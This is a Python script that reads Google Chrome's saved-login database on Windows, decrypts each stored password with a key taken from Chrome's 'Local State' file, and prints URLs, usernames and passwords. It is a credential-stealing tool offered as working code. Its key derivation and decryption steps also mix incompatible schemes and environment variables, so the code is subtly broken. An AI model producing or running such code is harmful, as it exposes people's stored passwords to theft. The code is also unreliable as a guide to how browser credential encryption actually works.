import os
import json
import base64
import sqlite3
import shutil
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import scrypt
from datetime import datetime, timedelta

def get_chrome_datetime(chrome_date):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["home"],
                                    "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return scrypt(key, b'saltysalt', 32, N=2**14, r=8, p=1)

def decrypt_password(encrypted_password, key):
    cipher = AES.new(key, AES.MODE_GCM, encrypted_password[3:15])
    decrypted_password = cipher.decrypt(encrypted_password[15:])
    decrypted_password = decrypted_password[:-decrypted_password[-1]]
    try:
        return decrypted_password.decode()
    except UnicodeDecodeError:
        return decrypted_password

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Login Data")
    temp_db_path = "LoginData.db"
    shutil.copy2(db_path, temp_db_path)
    conn = sqlite3.connect(temp_db_path)
    cursor = conn.cursor()

    cursor.execute("SELECT action_url, username_value, password_value, date_created, date_last_used FROM logins")
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        if username or encrypted_password:
            decrypted_password = decrypt_password(encrypted_password, key)
            date_created = get_chrome_datetime(row[3]).strftime("%Y-%m-%d %H:%M:%S")
            date_last_used = get_chrome_datetime(row[4]).strftime("%Y-%m-%d %H:%M:%S")

            print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\nDate created: {date_created}\nDate last used: {date_last_used}\n")

    conn.close()
    os.remove(temp_db_path)

if __name__ == "__main__":
    main()
